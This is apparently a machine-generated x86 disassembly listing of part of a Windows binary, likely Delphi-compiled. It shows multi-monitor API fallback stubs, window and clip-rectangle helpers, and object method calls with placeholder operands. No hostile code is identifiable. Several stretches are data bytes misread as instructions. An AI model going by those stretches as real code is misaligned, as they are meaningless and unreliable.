push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_429c64
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_429dd4
sub_429efa
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_429c64
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_429f7b
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_429c64
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42a068
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_429c64
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42a13c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_429c64
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42a210
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_429c64
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42a3ab
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42a3d1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a3d8
retn
sub_42a3ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a411
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a418
retn
sub_42a424
sub [ edx + eax * 2 + 0x490d0f00 ] ah
dec eax
insb
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
dec esp
adc [ eax ] eax
add [ eax - 0x6d ] ebx
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a418
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
movsd [ edi ] [ esi ]
inc edx
add [ eax + eax ] cl
add [ eax ] al
and [ eax + 0x40 ] dh
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0xa4907265
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
call [ esp + 0x110f0042 ]
dec ecx
inc ebx
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x114c7265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x40042a4 ] dl
add [ eax ] al
add [ edi ] cl
push esp
dec eax
insb
jns r-xdata
add [ eax ] ah
jo r-xdata
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
outsb
je r-xdata
add al al
dec edi
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
movsd [ edi ] [ esi ]
outsb
je r-xdata
adc eax 0x65705349
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x42a460c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dh
cmpsb [ esi ] [ edi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x5a ] al
inc edx
add [ eax + eax ] cl
add [ eax ] al
fcom [ eax ]
inc eax
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42b1b7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
jo r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0xa4cc7265
inc edx
add [ ecx ] al
xchg bx ax
cld
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
adc al 0x45
dec eax
insb
jo r-xdata
inc eax
add [ ecx + esi ] cl
outsb
je r-xdata
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x42a54cc0 ]
movsd [ edi ] [ esi ]
inc edx
add bh bh
dec [ 0x150f0042 ]
dec ecx
push ebx
jo r-xdata
push cs
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
movsb [ edi ] [ esi ]
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
insd
dec esp
adc [ eax ] eax
add [ ebx - 0x6d ] edx
cld
mov al 0xe
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x42a4d0c0 ]
add [ edi ] cl
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403f40
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
add al 0x0
jo r-xdata
imul ebp [ edi + 0x6e ] 0x3000408d
cmpsb [ esi ] [ edi ]
inc edx
add [ eax ] al
add [ eax ] al
jae r-xdata
jae r-xdata
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
jo r-xdata
cmp cl [ ecx ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
jmp r-xdata
int3
mov eax eax
lea eax [ eax ]
int3
add bh bh
dec [ ebp - 0x5a33ffc0 ]
inc edx
add [ eax ] al
add [ eax ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b1be
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404968
lea eax [ ebp - 0x8 ]
call sub_405758
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40579c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_429610
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405770
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40579c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42a7e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42a85e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42a974
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405770
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a865
lea eax [ ebp - 0x8 ]
call sub_405758
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a900
mov [ rw-data ] eax
sub_42a86c
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a900
mov [ rw-data ] eax
mov ecx r-xdata
call sub_40579c
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42a8c4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_405770
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_42a900
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403144
mov dl 0x1
mov eax [ r-xdata ]
call sub_4295d4
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4295d4
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4295d4
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403eec
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_42a974
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42aa75
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a8c4
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_429624
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_405758
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cffc
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405758
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cffc
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a8c4
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_429624
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a8c4
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_429624
mov ecx r-xdata
call sub_40579c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aa7c
lea eax [ ebp - 0xc ]
call sub_405758
lea eax [ ebp - 0x8 ]
call sub_405758
retn
sub edx 0xfffffff8
sub_42aa94
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_429610
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42aad4
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_429610
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42ab04
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42ac96
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_429610
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42ac31
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ac9d
lea eax [ ebp - 0x10 ]
call sub_403eec
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_429610
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
mov eax esi
xor edx edx
call sub_429610
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_429610
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403174
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_429610
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42aca4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42ad89
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ad90
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404968
lea eax [ ebp - 0x8 ]
call sub_405758
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_429610
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405770
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40579c
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_429610
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405770
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40579c
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42afc0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42b0b3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403f40
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b0ba
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404968
lea eax [ ebp - 0x10 ]
call sub_405758
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_40579c
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_429610
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_405770
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_40579c
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42b0d8
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42b1b7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403f40
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b1be
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404968
lea eax [ ebp - 0x8 ]
call sub_405758
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40579c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_429610
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405770
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40579c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42b1d8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4057cc
xor eax eax
push ebp
push sub_42b227
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405770
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b22e
lea eax [ ebx + 0xc ]
call sub_405758
sub_42b234
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
